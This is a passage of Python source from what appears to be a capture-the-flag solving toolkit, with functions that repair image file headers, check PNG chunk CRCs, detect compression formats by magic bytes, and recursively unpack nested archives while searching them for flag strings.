    print(f'Adding SOI marker (was {{data[:2].hex()}})')
    data = bytearray(b'\\xff\\xd8') + data
# Ensure EOI marker at end
if data[-2:] != b'\\xff\\xd9':
    print(f'Adding EOI marker')
    data += b'\\xff\\xd9'
# Find JFIF/EXIF APP0
markers = []
i = 0
while i < len(data)-1:
    if data[i] == 0xFF and data[i+1] not in (0x00, 0xFF):
        markers.append((i, hex(data[i+1])))
        i += 2
    else:
        i += 1
print(f'JPEG markers: {{markers[:10]}}')
with open({repr(out)}, 'wb') as f: f.write(data)
print(f'Saved: {repr(out)}')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "check_crc":
        code = f"""
import struct, binascii
with open({repr(sp)}, 'rb') as f: data = f.read()
if data[:8] != b'\\x89PNG\\r\\n\\x1a\\n':
    print('Not a valid PNG file')
    exit()
i = 8
chunk_num = 0
while i < len(data):
    if i+8 > len(data): break
    length = struct.unpack('>I', data[i:i+4])[0]
    chunk_type = data[i+4:i+8].decode(errors='replace')
    chunk_data = data[i+4:i+8+length]
    crc_stored = struct.unpack('>I', data[i+8+length:i+12+length])[0]
    crc_calc   = binascii.crc32(chunk_data) & 0xffffffff
    ok = 'OK' if crc_stored == crc_calc else f'[!] MISMATCH stored={{hex(crc_stored)}} calc={{hex(crc_calc)}}'
    print(f'Chunk {{chunk_num:2d}}: {{chunk_type}} len={{length}} CRC={{ok}}')
    chunk_num += 1
    i += 12 + length
    if chunk_type == 'IEND': break
"""
        return tool_execute_python(code, timeout=10)

    return "Operations: detect, fix_png_header, fix_jpeg_markers, restore_dimensions, fix_bmp_header, check_crc"


def tool_compression(file_path: str = "", operation: str = "detect",
                      output_dir: str = "", max_depth: int = 10,
                      data_hex: str = "") -> str:
    """Multi-format decompression using 7z + unar + Python stdlib.
    Ops: detect (identify compression type from magic bytes),
    decompress (extract using best available tool),
    nested_extract (recursive decompression — handles 'file-in-file-in-file' chains),
    try_all (try every decompressor until one succeeds),
    list_contents (list archive contents without extracting)."""

    sp = (_w2l(file_path) if (IS_WINDOWS and USE_WSL) else file_path) if file_path else ""
    od = output_dir or f"/tmp/decompress_{int(time.time())}"
    _shell(f"mkdir -p '{od}'")

    if operation == "detect":
        file_out = _shell(f"file '{sp}' 2>&1", timeout=5) if sp else ""
        code = f"""
import binascii
path = {repr(sp)}
data_hex = {repr(data_hex)}
if path:
    with open(path, 'rb') as f: data = f.read(16)
else:
    data = binascii.unhexlify(data_hex[:32]) if data_hex else b''

magic_map = {{
    b'\\x1f\\x8b': 'gzip',
    b'BZh': 'bzip2',
    b'\\xfd7zXZ': 'xz/lzma',
    b'PK\\x03\\x04': 'zip',
    b'Rar!': 'rar',
    b'7z\\xbc\\xaf': '7-zip',
    b'\\x1f\\x9d': 'compress (.Z)',
    b'\\x04\\x22\\x4d\\x18': 'lz4',
    b'\\x28\\xb5\\x2f\\xfd': 'zstd',
    b'\\x89PNG': 'png',
    b'\\xff\\xd8\\xff': 'jpeg',
    b'GIF8': 'gif',
    b'\\x7fELF': 'elf',
    b'MZ': 'pe/exe',
    b'%PDF': 'pdf',
}}
for sig, name in magic_map.items():
    if data[:len(sig)] == sig:
        print(f'Detected: {{name}} ({{}})'.format(sig.hex()))
        break
else:
    print(f'Unknown: {{data[:8].hex()}}')
"""
        return (f"file: {file_out}\n" if file_out else "") + tool_execute_python(code, timeout=5)

    if operation in ("decompress", "list_contents"):
        action = "l" if operation == "list_contents" else f"x -o'{od}'"
        out = _shell(f"7z {action} '{sp}' 2>&1 | head -40", timeout=30)
        if "not found" in out:
            out = _shell(f"unar -o '{od}' '{sp}' 2>&1 | head -30", timeout=30)
        if "not found" in out:
            # Python stdlib fallback
            code = f"""
import gzip, bz2, lzma, zipfile, tarfile, os
sp = {repr(sp)}
od = {repr(od)}
try:
    if sp.endswith('.gz') or sp.endswith('.tgz'):
        with gzip.open(sp, 'rb') as f: data = f.read()
        out = sp.replace('.gz','').replace('.tgz','.tar')
        open(os.path.join(od, os.path.basename(out)),'wb').write(data)
        print(f'Extracted gzip: {{len(data)}} bytes')
    elif sp.endswith('.bz2'):
        with bz2.open(sp,'rb') as f: data = f.read()
        open(os.path.join(od,os.path.basename(sp[:-4])),'wb').write(data)
        print(f'Extracted bz2: {{len(data)}} bytes')
    elif sp.endswith('.xz') or sp.endswith('.lzma'):
        with lzma.open(sp,'rb') as f: data = f.read()
        open(os.path.join(od,os.path.basename(sp[:-3])),'wb').write(data)
        print(f'Extracted xz/lzma: {{len(data)}} bytes')
    elif zipfile.is_zipfile(sp):
        with zipfile.ZipFile(sp) as z: z.extractall(od); print(f'Extracted zip: {{z.namelist()}}')
    elif tarfile.is_tarfile(sp):
        with tarfile.open(sp) as t: t.extractall(od); print(f'Extracted tar: {{t.getnames()[:10]}}')
    else:
        print(f'No matching Python extractor for {{sp}}')
except Exception as ex:
    print(f'Error: {{ex}}')
"""
            out = tool_execute_python(code, timeout=20)
        return out

    if operation == "nested_extract":
        code = f"""
import subprocess, os, shutil

def decompress_one(path, outdir):
    os.makedirs(outdir, exist_ok=True)
    r = subprocess.run(['7z', 'x', '-y', f'-o{{outdir}}', path],
                       capture_output=True, text=True, timeout=30)
    if r.returncode != 0:
        r2 = subprocess.run(['unar', '-o', outdir, path], capture_output=True, text=True, timeout=30)
        return r2.returncode == 0
    return True

current = [{repr(sp)}]
depth = 0
max_depth = {max_depth}
found_flag = False

while current and depth < max_depth:
    depth += 1
    next_files = []
    print(f'\\n=== Depth {{depth}} ===')
    for f in current:
        outdir = f'{repr(od)}/depth_{{depth}}_{{os.path.basename(f)}}'
        print(f'Extracting: {{f}}')
        ok = decompress_one(f, outdir)
        if ok:
            for root, dirs, files in os.walk(outdir):
                for fname in files:
                    fp = os.path.join(root, fname)
                    print(f'  -> {{fp}}')
                    # Check for flag
                    try:
                        content = open(fp,'rb').read(1000).decode(errors='replace')
                        if 'picoCTF' in content or 'flag{{' in content.lower():
                            print(f'[!] FLAG FOUND: {{content[:200]}}')
                            found_flag = True
                    except: pass
                    next_files.append(fp)
        else:
            print(f'  (not an archive)')
    current = [f for f in next_files if any(f.endswith(e) for e in
               ['.gz','.bz2','.xz','.zip','.tar','.rar','.7z','.lzma','.Z','.zst'])]

if not found_flag:
    print(f'\\nNo flag found after {{depth}} levels of extraction')
"""
        return tool_execute_python(code, timeout=120)

    if operation == "try_all":
        results = []
        for fmt_cmd in [f"gzip -d -k '{sp}' -c", f"bzip2 -d -k '{sp}' -c",
                        f"7z x -y -o'{od}' '{sp}'"]:
            out = _shell(f"{fmt_cmd} 2>&1 | head -10", timeout=15)
            if "error" not in out.lower()[:20] and "not found" not in out:
                results.append(f"[{fmt_cmd.split()[0]}] {out[:100]}")
        return "\n".join(results) if results else _shell(f"7z x -y -o'{od}' '{sp}' 2>&1", timeout=30)

    return "Operations: detect, decompress, nested_extract, try_all, list_contents"

